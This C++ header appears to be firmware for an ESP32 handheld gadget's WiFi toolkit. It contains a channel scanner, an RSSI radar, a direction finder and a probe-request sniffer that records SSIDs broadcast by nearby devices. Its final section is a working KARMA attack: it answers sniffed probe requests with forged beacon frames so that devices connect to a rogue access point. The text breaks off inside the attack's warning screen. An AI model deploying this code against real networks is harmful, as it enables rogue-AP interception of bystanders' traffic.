// ═══════════════════════════════════════════════════════════
// COMPANION OS v7.0 — DR. HACK: WIFI TOOLS
// Channel Scan, WiFi Radar, Direction Finder,
// Probe Sniffer, KARMA Attack
// Adapted from ESP32-TOOLS-PRO for 160×128 ST7735R
// ═══════════════════════════════════════════════════════════
#ifndef DH_WIFI_TOOLS_H
#define DH_WIFI_TOOLS_H

#ifdef ESP32

#include "globals.h"
#include "ui_components.h"
#include <WiFi.h>
#include "esp_wifi.h"

// ═══════════════════════════════════════════════════════════
// SHARED HELPERS
// ═══════════════════════════════════════════════════════════

static void dhWifiPrepare() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false);
  delay(80);
}

static uint16_t dhRssiColor(int rssi) {
  if (rssi >= -58) return CLR_SUCCESS;
  if (rssi >= -74) return CLR_WARNING;
  if (rssi >= -88) return 0xFD20;
  return CLR_SECONDARY;
}

static uint8_t dhRssiPct(int rssi) {
  if (rssi <= -100) return 0;
  if (rssi >= -35)  return 100;
  return (uint8_t)(((rssi + 100) * 100) / 65);
}

// ═══════════════════════════════════════════════════════════
// TOOL: WiFi Channel Scanner
// Groups networks by channel 1-13, bar chart, drill-down
// ═══════════════════════════════════════════════════════════

#define DH_CH_MIN 1
#define DH_CH_MAX 13
#define DH_CH_MAX_NETS 30
#define DH_CH_VISIBLE 5

struct DH_ChNet {
  String ssid;
  int channel;
  int rssi;
  uint8_t auth;
};

static DH_ChNet dhChNets[DH_CH_MAX_NETS];
static int dhChNetCount = 0;
static uint8_t dhChCounts[14];
static int dhChBestRssi[14];
static int dhChCursor = 1;
static int dhChScroll = 0;

static void dhChScan() {
  dhChNetCount = 0;
  memset(dhChCounts, 0, sizeof(dhChCounts));
  for (int i = 0; i < 14; i++) dhChBestRssi[i] = -127;

  dhWifiPrepare();
  tft.fillScreen(CLR_BG);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawCentreString("Scanning CH 1-13", SCR_CX, SCR_CY - 5, 1);

  int n = WiFi.scanNetworks(false, true);
  if (n < 0) n = 0;

  for (int i = 0; i < n; i++) {
    if (dhChNetCount >= DH_CH_MAX_NETS) break;
    int ch = WiFi.channel(i);
    if (ch < DH_CH_MIN || ch > DH_CH_MAX) continue;
    DH_ChNet& net = dhChNets[dhChNetCount++];
    net.ssid = WiFi.SSID(i);
    net.channel = ch;
    net.rssi = WiFi.RSSI(i);
    net.auth = WiFi.encryptionType(i);
    dhChCounts[ch]++;
    if (net.rssi > dhChBestRssi[ch]) dhChBestRssi[ch] = net.rssi;
  }
  WiFi.scanDelete();
}

static void dhChDrawList() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  char hdr[24]; sprintf(hdr, "CH SCAN [%d]", dhChNetCount);
  tft.drawString(hdr, SCALE_X(4), SCALE_Y(2), 1);

  uint8_t maxC = 1;
  for (int ch = DH_CH_MIN; ch <= DH_CH_MAX; ch++)
    if (dhChCounts[ch] > maxC) maxC = dhChCounts[ch];

  int listY = SCALE_Y(18);
  int rowH = SCALE_Y(20);

  for (int i = 0; i < DH_CH_VISIBLE; i++) {
    int ch = DH_CH_MIN + dhChScroll + i;
    if (ch > DH_CH_MAX) break;
    int y = listY + i * rowH;
    bool sel = (ch == dhChCursor);

    if (sel) {
      tft.fillRect(0, y, SCR_W, rowH - 1, CLR_SURFACE_2);
      tft.drawRect(0, y, SCR_W, rowH - 1, CLR_PRIMARY);
    }

    char label[16]; sprintf(label, "CH%2d %dn", ch, dhChCounts[ch]);
    tft.setTextColor(sel ? CLR_TEXT_HI : CLR_TEXT_MED);
    tft.drawString(label, SCALE_X(4), y + SCALE_Y(2), 1);

    int barMaxW = SCALE_X(50);
    int barW = dhChCounts[ch] > 0 ? (dhChCounts[ch] * barMaxW) / maxC : 0;
    uint16_t barCol = dhChCounts[ch] == 0 ? CLR_BORDER : dhRssiColor(dhChBestRssi[ch]);
    tft.drawRect(SCALE_X(60), y + SCALE_Y(4), barMaxW + 2, SCALE_Y(8), CLR_BORDER);
    if (barW > 0) tft.fillRect(SCALE_X(61), y + SCALE_Y(5), barW, SCALE_Y(6), barCol);

    if (dhChCounts[ch] > 0) {
      char rssi[10]; sprintf(rssi, "%ddB", dhChBestRssi[ch]);
      tft.setTextColor(CLR_TEXT_LO);
      tft.drawString(rssi, SCALE_X(115), y + SCALE_Y(4), 1);
    }
  }

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("<:Scrl >:Scrl O:Back", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
}

static void dhRunChannelScan() {
  dhChScan();
  dhChCursor = 1; dhChScroll = 0;
  dhChDrawList();

  unsigned long holdStart = 0; bool holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      dhChCursor = (dhChCursor <= DH_CH_MIN) ? DH_CH_MAX : dhChCursor - 1;
      if (dhChCursor < DH_CH_MIN + dhChScroll) dhChScroll = dhChCursor - DH_CH_MIN;
      if (dhChCursor >= DH_CH_MIN + dhChScroll + DH_CH_VISIBLE)
        dhChScroll = dhChCursor - DH_CH_MIN - DH_CH_VISIBLE + 1;
      dhChDrawList(); delay(180);
    }
    if ((digitalRead(BTN_RIGHT) == LOW || (virtualRightPressed ? (virtualRightPressed=false, true) : false))) {
      dhChCursor = (dhChCursor >= DH_CH_MAX) ? DH_CH_MIN : dhChCursor + 1;
      if (dhChCursor < DH_CH_MIN + dhChScroll) dhChScroll = dhChCursor - DH_CH_MIN;
      if (dhChCursor >= DH_CH_MIN + dhChScroll + DH_CH_VISIBLE)
        dhChScroll = dhChCursor - DH_CH_MIN - DH_CH_VISIBLE + 1;
      dhChDrawList(); delay(180);
    }
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }
    delay(10);
  }
}

// ═══════════════════════════════════════════════════════════
// TOOL: WiFi Radar — RSSI tracking for selected AP
// ═══════════════════════════════════════════════════════════

#define DH_RADAR_MAX 20
#define DH_RADAR_VIS 5
#define DH_RADAR_HIST 30

struct DH_RadarAp {
  String ssid, bssid;
  int channel, rssi;
};

static DH_RadarAp dhRadarAps[DH_RADAR_MAX];
static int dhRadarCount = 0;
static int dhRadarSel = 0, dhRadarScroll = 0;

static DH_RadarAp dhRadarTarget;
static int dhRadarRssi = -127, dhRadarBest = -127;
static int dhRadarTrend = 0;
static int16_t dhRadarHistory[DH_RADAR_HIST];
static int dhRadarHistHead = 0;
static uint32_t dhRadarPass = 0;
static bool dhRadarSeen = false;

static bool dhRadarScanTarget() {
  dhWifiPrepare();
  int n = WiFi.scanNetworks(false, true, false, 170, dhRadarTarget.channel);
  bool found = false;
  int best = -127;
  for (int i = 0; i < n; i++) {
    if (WiFi.BSSIDstr(i).equalsIgnoreCase(dhRadarTarget.bssid)) {
      best = WiFi.RSSI(i); found = true; break;
    }
  }
  WiFi.scanDelete();
  int prevRssi = dhRadarRssi;
  dhRadarSeen = found;
  dhRadarPass++;
  if (found) {
    dhRadarRssi = best;
    if (best > dhRadarBest) dhRadarBest = best;
    dhRadarTrend = (prevRssi < -120) ? 0 : best - prevRssi;
  } else {
    dhRadarRssi = -127; dhRadarTrend = -8;
  }
  dhRadarHistory[dhRadarHistHead] = found ? (int16_t)best : -100;
  dhRadarHistHead = (dhRadarHistHead + 1) % DH_RADAR_HIST;
  return found;
}

static void dhRadarDrawScreen() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  String ssid = dhRadarTarget.ssid.length() > 0 ? dhRadarTarget.ssid : "<HIDDEN>";
  drawTruncatedText(SCALE_X(4), SCALE_Y(2), ssid.c_str(), SCALE_X(120), CLR_TEXT_HI, 1);

  uint8_t pct = dhRadarSeen ? dhRssiPct(dhRadarRssi) : 0;
  uint16_t col = dhRadarSeen ? dhRssiColor(dhRadarRssi) : CLR_SECONDARY;

  // Radar circle
  int cx = SCALE_X(40), cy = SCALE_Y(55);
  int maxR = SCALE_X(28);
  tft.drawCircle(cx, cy, maxR, CLR_PRIMARY);
  tft.drawCircle(cx, cy, maxR * 2 / 3, CLR_BORDER);
  tft.drawCircle(cx, cy, maxR / 3, CLR_BORDER);

  if (dhRadarSeen) {
    int dotR = map(pct, 0, 100, maxR - 2, 4);
    float angle = ((dhRadarPass * 37) % 360) * 0.0174532925f;
    int dx = cx + (int)(cosf(angle) * dotR);
    int dy = cy + (int)(sinf(angle) * dotR);
    tft.fillCircle(dx, dy, 3, col);
  }
  tft.fillCircle(cx, cy, 2, CLR_PRIMARY);

  // Stats right side
  int sx = SCALE_X(80);
  char buf[24];
  sprintf(buf, "%s", dhRadarSeen ? String(String(dhRadarRssi) + "dBm").c_str() : "-- dBm");
  tft.setTextColor(col); tft.drawString(buf, sx, SCALE_Y(20), 1);
  sprintf(buf, "%d%%", pct);
  tft.setTextColor(col); tft.drawString(buf, sx, SCALE_Y(32), 1);
  sprintf(buf, "Peak:%s", dhRadarBest > -120 ? String(dhRadarBest).c_str() : "--");
  tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, sx, SCALE_Y(44), 1);

  const char* trend = !dhRadarSeen ? "SEARCH" :
    (dhRadarTrend >= 4 ? "CLOSER" : (dhRadarTrend <= -4 ? "FARTHER" : "STABLE"));
  uint16_t tCol = !dhRadarSeen ? CLR_SECONDARY :
    (dhRadarTrend >= 4 ? CLR_SUCCESS : (dhRadarTrend <= -4 ? CLR_WARNING : CLR_PRIMARY));
  tft.setTextColor(tCol); tft.drawString(trend, sx, SCALE_Y(56), 1);

  // Proximity label
  const char* prox = !dhRadarSeen ? "LOST" :
    (pct >= 76 ? "VERY CLOSE" : (pct >= 52 ? "CLOSE" : (pct >= 28 ? "NEAR" : "FAR")));
  tft.setTextColor(col); tft.drawString(prox, sx, SCALE_Y(68), 1);

  // History bar chart
  int histY = SCALE_Y(82), histH = SCALE_Y(20);
  tft.drawRect(SCALE_X(4), histY, SCR_W - SCALE_X(8), histH, CLR_BORDER);
  int maxPps = max(abs(dhRadarBest), 10);
  for (int i = 0; i < DH_RADAR_HIST; i++) {
    int idx = (dhRadarHistHead + i) % DH_RADAR_HIST;
    if (dhRadarHistory[idx] == 0) continue;
    uint8_t p = dhRssiPct(dhRadarHistory[idx]);
    int barH = max(1, (int)(p * (histH - 4)) / 100);
    int bx = SCALE_X(6) + (i * (SCR_W - SCALE_X(12))) / DH_RADAR_HIST;
    tft.drawFastVLine(bx, histY + histH - 2 - barH, barH, dhRssiColor(dhRadarHistory[idx]));
  }

  // Footer
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL:rescan HOLD:back", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
}

static void dhRadarTrack() {
  dhRadarRssi = -127; dhRadarBest = -127; dhRadarTrend = 0;
  dhRadarHistHead = 0; dhRadarPass = 0; dhRadarSeen = false;
  memset(dhRadarHistory, 0, sizeof(dhRadarHistory));

  dhRadarScanTarget();
  dhRadarDrawScreen();
  unsigned long lastScan = millis();
  unsigned long holdStart = 0; bool holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if (millis() - lastScan > 950) {
      dhRadarScanTarget();
      dhRadarDrawScreen();
      lastScan = millis();
    }
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else {
      if (holding && millis() - holdStart < 800) {
        dhRadarScanTarget(); dhRadarDrawScreen(); lastScan = millis();
      }
      holding = false;
    }
    delay(15);
  }
}

static void dhRunWifiRadar() {
  dhWifiPrepare();
  tft.fillScreen(CLR_BG);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawCentreString("Scanning APs...", SCR_CX, SCR_CY, 1);

  dhRadarCount = 0;
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) n = 0;
  for (int i = 0; i < n; i++) {
    if (dhRadarCount >= DH_RADAR_MAX) break;
    DH_RadarAp& ap = dhRadarAps[dhRadarCount++];
    ap.ssid = WiFi.SSID(i); ap.bssid = WiFi.BSSIDstr(i);
    ap.channel = WiFi.channel(i); ap.rssi = WiFi.RSSI(i);
  }
  WiFi.scanDelete();

  // Sort by RSSI
  for (int i = 0; i < dhRadarCount - 1; i++)
    for (int j = 0; j < dhRadarCount - 1 - i; j++)
      if (dhRadarAps[j].rssi < dhRadarAps[j+1].rssi) {
        DH_RadarAp tmp = dhRadarAps[j]; dhRadarAps[j] = dhRadarAps[j+1]; dhRadarAps[j+1] = tmp;
      }

  if (dhRadarCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("No APs found", SCR_CX, SCR_CY, 1);
    delay(2000); return;
  }

  // Show AP list for selection
  dhRadarSel = 0; dhRadarScroll = 0;
  auto drawList = [&]() {
    tft.fillScreen(CLR_BG);
    drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
    tft.setTextColor(CLR_TEXT_HI);
    char hdr[20]; sprintf(hdr, "RADAR [%d]", dhRadarCount);
    tft.drawString(hdr, SCALE_X(4), SCALE_Y(2), 1);

    int listY = SCALE_Y(18), rowH = SCALE_Y(20);
    for (int i = 0; i < DH_RADAR_VIS; i++) {
      int idx = i + dhRadarScroll;
      if (idx >= dhRadarCount) break;
      int y = listY + i * rowH;
      bool sel = (idx == dhRadarSel);
      if (sel) { tft.fillRect(0, y, SCR_W, rowH-1, CLR_SURFACE_2); tft.drawRect(0, y, SCR_W, rowH-1, CLR_PRIMARY); }
      String ssid = dhRadarAps[idx].ssid.length() > 0 ? dhRadarAps[idx].ssid : "<HIDDEN>";
      tft.setTextColor(sel ? CLR_TEXT_HI : CLR_TEXT_MED);
      drawTruncatedText(SCALE_X(4), y + SCALE_Y(2), ssid.c_str(), SCALE_X(90), sel ? CLR_TEXT_HI : CLR_TEXT_MED, 1);
      char rssi[10]; sprintf(rssi, "%ddBm", dhRadarAps[idx].rssi);
      tft.setTextColor(dhRssiColor(dhRadarAps[idx].rssi));
      tft.drawString(rssi, SCR_W - SCALE_X(36), y + SCALE_Y(2), 1);
    }
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString("</>:Scrl SEL:Track", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
  };

  drawList();
  unsigned long holdStart = 0; bool holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      dhRadarSel = (dhRadarSel <= 0) ? dhRadarCount-1 : dhRadarSel-1;
      if (dhRadarSel < dhRadarScroll) dhRadarScroll = dhRadarSel;
      if (dhRadarSel >= dhRadarScroll + DH_RADAR_VIS) dhRadarScroll = dhRadarSel - DH_RADAR_VIS + 1;
      drawList(); delay(180);
    }
    if ((digitalRead(BTN_RIGHT) == LOW || (virtualRightPressed ? (virtualRightPressed=false, true) : false))) {
      dhRadarSel = (dhRadarSel >= dhRadarCount-1) ? 0 : dhRadarSel+1;
      if (dhRadarSel < dhRadarScroll) dhRadarScroll = dhRadarSel;
      if (dhRadarSel >= dhRadarScroll + DH_RADAR_VIS) dhRadarScroll = dhRadarSel - DH_RADAR_VIS + 1;
      drawList(); delay(180);
    }
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else {
      if (holding && millis() - holdStart < 800) {
        dhRadarTarget = dhRadarAps[dhRadarSel];
        dhRadarTrack();
        drawList();
      }
      holding = false;
    }
    delay(10);
  }
}

// ═══════════════════════════════════════════════════════════
// TOOL: WiFi Direction Finder — 4-sector RSSI comparison
// ═══════════════════════════════════════════════════════════

#define DH_DIR_SAMPLES 3

static DH_RadarAp dhDirTarget;

static bool dhDirMeasure(int& rssiOut) {
  dhWifiPrepare();
  int sum = 0, hits = 0;
  for (int s = 0; s < DH_DIR_SAMPLES; s++) {
    tft.fillRect(SCALE_X(4), SCALE_Y(60), SCR_W - SCALE_X(8), SCALE_Y(14), CLR_BG);
    char buf[16]; sprintf(buf, "Sample %d/%d", s+1, DH_DIR_SAMPLES);
    tft.setTextColor(CLR_TEXT_MED); tft.drawString(buf, SCALE_X(4), SCALE_Y(60), 1);

    int n = WiFi.scanNetworks(false, true, false, 170, dhDirTarget.channel);
    for (int i = 0; i < n; i++) {
      if (WiFi.BSSIDstr(i).equalsIgnoreCase(dhDirTarget.bssid)) {
        sum += WiFi.RSSI(i); hits++; break;
      }
    }
    WiFi.scanDelete();
    delay(90);
  }
  if (hits == 0) { rssiOut = -127; return false; }
  rssiOut = sum / hits;
  return true;
}

static void dhRunWifiDirection() {
  // First scan for APs (reuse radar scan logic)
  dhWifiPrepare();
  tft.fillScreen(CLR_BG);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawCentreString("Scanning APs...", SCR_CX, SCR_CY, 1);

  dhRadarCount = 0;
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) n = 0;
  for (int i = 0; i < n; i++) {
    if (dhRadarCount >= DH_RADAR_MAX) break;
    DH_RadarAp& ap = dhRadarAps[dhRadarCount++];
    ap.ssid = WiFi.SSID(i); ap.bssid = WiFi.BSSIDstr(i);
    ap.channel = WiFi.channel(i); ap.rssi = WiFi.RSSI(i);
  }
  WiFi.scanDelete();

  if (dhRadarCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("No APs found", SCR_CX, SCR_CY, 1);
    delay(2000); return;
  }

  // Use strongest AP
  int bestIdx = 0;
  for (int i = 1; i < dhRadarCount; i++)
    if (dhRadarAps[i].rssi > dhRadarAps[bestIdx].rssi) bestIdx = i;

  dhDirTarget.ssid = dhRadarAps[bestIdx].ssid;
  dhDirTarget.bssid = dhRadarAps[bestIdx].bssid;
  dhDirTarget.channel = dhRadarAps[bestIdx].channel;

  static const char* sectors[] = {"FRONT", "RIGHT", "BACK", "LEFT"};
  int values[4] = {-127, -127, -127, -127};
  bool valid[4] = {false, false, false, false};

  for (int i = 0; i < 4; i++) {
    tft.fillScreen(CLR_BG);
    drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
    tft.setTextColor(CLR_TEXT_HI);
    tft.drawString("DIRECTION", SCALE_X(4), SCALE_Y(2), 1);

    tft.setTextColor(CLR_TEXT_MED);
    tft.drawCentreString("Point device at:", SCR_CX, SCALE_Y(30), 1);
    tft.setTextColor(CLR_PRIMARY);
    tft.drawCentreString(sectors[i], SCR_CX, SCALE_Y(46), 2);

    String ssid = dhDirTarget.ssid.length() > 0 ? dhDirTarget.ssid : "<HIDDEN>";
    tft.setTextColor(CLR_WARNING);
    drawTruncatedText(SCALE_X(4), SCALE_Y(70), ssid.c_str(), SCR_W - SCALE_X(8), CLR_WARNING, 1);

    tft.setTextColor(CLR_TEXT_LO);
    tft.drawCentreString("SEL: Measure", SCR_CX, SCR_H - SCALE_Y(12), 1);

    // Wait for SELECT
    dhWaitSelectPress();
    delay(200);

    valid[i] = dhDirMeasure(values[i]);
  }

  // Show results
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SUCCESS, darkenColor(CLR_SUCCESS, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("RESULT", SCALE_X(4), SCALE_Y(2), 1);

  int bestSector = -1;
  for (int i = 0; i < 4; i++)
    if (valid[i] && (bestSector < 0 || values[i] > values[bestSector])) bestSector = i;

  if (bestSector >= 0) {
    tft.setTextColor(CLR_SUCCESS);
    tft.drawCentreString(sectors[bestSector], SCR_CX, SCALE_Y(22), 2);
  } else {
    tft.setTextColor(CLR_SECONDARY);
    tft.drawCentreString("UNCLEAR", SCR_CX, SCALE_Y(22), 2);
  }

  int y = SCALE_Y(44);
  for (int i = 0; i < 4; i++) {
    uint16_t col = (i == bestSector) ? CLR_SUCCESS : (valid[i] ? CLR_PRIMARY : CLR_SECONDARY);
    tft.setTextColor(col);
    tft.drawString(sectors[i], SCALE_X(4), y, 1);

    int barW = valid[i] ? (dhRssiPct(values[i]) * SCALE_X(55)) / 100 : 0;
    tft.drawRect(SCALE_X(44), y + 1, SCALE_X(57), SCALE_Y(8), CLR_BORDER);
    if (barW > 0) tft.fillRect(SCALE_X(45), y + 2, barW, SCALE_Y(6), col);

    if (valid[i]) {
      char buf[10]; sprintf(buf, "%ddB", values[i]);
      tft.setTextColor(col); tft.drawString(buf, SCALE_X(104), y, 1);
    }
    y += SCALE_Y(18);
  }

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);

  dhWaitSelectPress();
  delay(200);
}

// ═══════════════════════════════════════════════════════════
// TOOL: Probe Sniffer — captures 802.11 probe requests
// ═══════════════════════════════════════════════════════════

#define DH_PROBE_MAX 30
#define DH_PROBE_VIS 5

struct DH_ProbeEntry {
  char ssid[33];
  int count;
  int rssi;
  unsigned long lastSeen;
};

static DH_ProbeEntry dhProbes[DH_PROBE_MAX];
static volatile int dhProbeCount = 0;
static volatile uint32_t dhProbeTotal = 0;
static volatile int dhProbeCh = 1;
static int dhProbeCursor = 0, dhProbeScroll = 0;

static void dhProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28) return;
  if (p[0] != 0x40) return;  // Not probe request

  uint8_t tagId = p[24], tagLen = p[25];
  if (tagId != 0x00 || tagLen == 0 || tagLen > 32) return;
  if (24 + 2 + tagLen > len) return;

  char ssid[33];
  memcpy(ssid, &p[26], tagLen);
  ssid[tagLen] = '\0';

  // Validate printable ASCII
  for (int i = 0; i < tagLen; i++)
    if ((uint8_t)ssid[i] < 32 || (uint8_t)ssid[i] > 126) return;

  dhProbeTotal++;

  // Check if already exists
  for (int i = 0; i < dhProbeCount; i++) {
    if (strcmp(dhProbes[i].ssid, ssid) == 0) {
      dhProbes[i].count++;
      dhProbes[i].rssi = pkt->rx_ctrl.rssi;
      dhProbes[i].lastSeen = millis();
      return;
    }
  }

  if (dhProbeCount < DH_PROBE_MAX) {
    strncpy(dhProbes[dhProbeCount].ssid, ssid, 32);
    dhProbes[dhProbeCount].ssid[32] = '\0';
    dhProbes[dhProbeCount].count = 1;
    dhProbes[dhProbeCount].rssi = pkt->rx_ctrl.rssi;
    dhProbes[dhProbeCount].lastSeen = millis();
    dhProbeCount++;
  }
}

static void dhProbeDrawList() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SUCCESS, darkenColor(CLR_SUCCESS, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  char hdr[24]; sprintf(hdr, "PROBE CH:%d T:%lu", dhProbeCh, (unsigned long)dhProbeTotal);
  tft.drawString(hdr, SCALE_X(2), SCALE_Y(2), 1);

  if (dhProbeCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("Waiting...", SCR_CX, SCR_CY, 1);
    return;
  }

  int listY = SCALE_Y(18), rowH = SCALE_Y(20);
  for (int i = 0; i < DH_PROBE_VIS; i++) {
    int idx = i + dhProbeScroll;
    if (idx >= dhProbeCount) break;
    int y = listY + i * rowH;
    bool sel = (idx == dhProbeCursor);
    if (sel) { tft.fillRect(0, y, SCR_W, rowH-1, CLR_SURFACE_2); }

    tft.setTextColor(sel ? CLR_TEXT_HI : CLR_TEXT_MED);
    drawTruncatedText(SCALE_X(2), y + SCALE_Y(1), dhProbes[idx].ssid, SCALE_X(85),
                      sel ? CLR_TEXT_HI : CLR_TEXT_MED, 1);

    char meta[16]; sprintf(meta, "x%d %ddB", dhProbes[idx].count, dhProbes[idx].rssi);
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString(meta, SCALE_X(2), y + SCALE_Y(10), 1);

    unsigned long ago = (millis() - dhProbes[idx].lastSeen) / 1000;
    char agoBuf[8]; sprintf(agoBuf, "%lus", ago);
    tft.drawString(agoBuf, SCR_W - SCALE_X(22), y + SCALE_Y(5), 1);
  }

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("HOLD SEL: stop", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
}

static void dhRunProbeSniffer() {
  dhProbeCount = 0; dhProbeTotal = 0;
  dhProbeCursor = 0; dhProbeScroll = 0;
  dhProbeCh = 1;

  static const int hopChs[] = {1, 6, 11};
  int hopIdx = 0;

  dhNetPaused = true;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(dhProbeCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&dhProbeCallback);

  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);

  unsigned long lastUI = millis(), lastHop = millis();
  unsigned long holdStart = 0; bool holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if (millis() - lastHop > 2000) {
      hopIdx = (hopIdx + 1) % 3;
      dhProbeCh = hopChs[hopIdx];
      esp_wifi_set_channel(dhProbeCh, WIFI_SECOND_CHAN_NONE);
      lastHop = millis();
    }

    if (millis() - lastUI > 500) {
      dhProbeDrawList();
      lastUI = millis();
    }

    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      if (dhProbeCount > 0) {
        dhProbeCursor = (dhProbeCursor + dhProbeCount - 1) % dhProbeCount;
        if (dhProbeCursor < dhProbeScroll) dhProbeScroll = dhProbeCursor;
        if (dhProbeCursor >= dhProbeScroll + DH_PROBE_VIS) dhProbeScroll = dhProbeCursor - DH_PROBE_VIS + 1;
        dhProbeDrawList();
      }
      delay(180);
    }
    if ((digitalRead(BTN_RIGHT) == LOW || (virtualRightPressed ? (virtualRightPressed=false, true) : false))) {
      if (dhProbeCount > 0) {
        dhProbeCursor = (dhProbeCursor + 1) % dhProbeCount;
        if (dhProbeCursor < dhProbeScroll) dhProbeScroll = dhProbeCursor;
        if (dhProbeCursor >= dhProbeScroll + DH_PROBE_VIS) dhProbeScroll = dhProbeCursor - DH_PROBE_VIS + 1;
        dhProbeDrawList();
      }
      delay(180);
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }

    delay(15);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  dhNetPaused = false;
  delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: KARMA Attack — responds to probes with matching SSIDs
// ═══════════════════════════════════════════════════════════

static volatile unsigned long dhKarmaCount = 0;
static volatile int dhKarmaSSIDs = 0;
static uint8_t dhKarmaMac[6];

static void dhKarmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28 || p[0] != 0x40) return;

  uint8_t tagLen = p[25];
  if (p[24] != 0x00 || tagLen == 0 || tagLen > 32) return;
  if (24 + 2 + tagLen > len) return;

  char ssid[33];
  memcpy(ssid, &p[26], tagLen);
  ssid[tagLen] = '\0';

  // Send a beacon with matching SSID
  uint8_t beacon[200] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00, 0x01, 0x04, 0x00, 0x00
  };
  static const uint8_t tail[] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    0x03, 0x01, 0x00
  };

  for (int i = 0; i < 6; i++) {
    beacon[10 + i] = dhKarmaMac[i];
    beacon[16 + i] = dhKarmaMac[i];
  }
  beacon[37] = (uint8_t)tagLen;
  memcpy(&beacon[38], ssid, tagLen);
  int tailOff = 38 + tagLen;
  memcpy(&beacon[tailOff], tail, sizeof(tail));
  beacon[tailOff + sizeof(tail) - 1] = pkt->rx_ctrl.channel;

  esp_wifi_80211_tx(WIFI_IF_AP, beacon, tailOff + sizeof(tail), false);
  dhKarmaCount++;
  dhKarmaSSIDs++;
}

static void dhRunKarma() {
  // Disclaimer
  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("KARMA WARNING", SCR_CX, SCALE_Y(10), 1);
  tft.setTextColor(CLR_TEXT_MED);
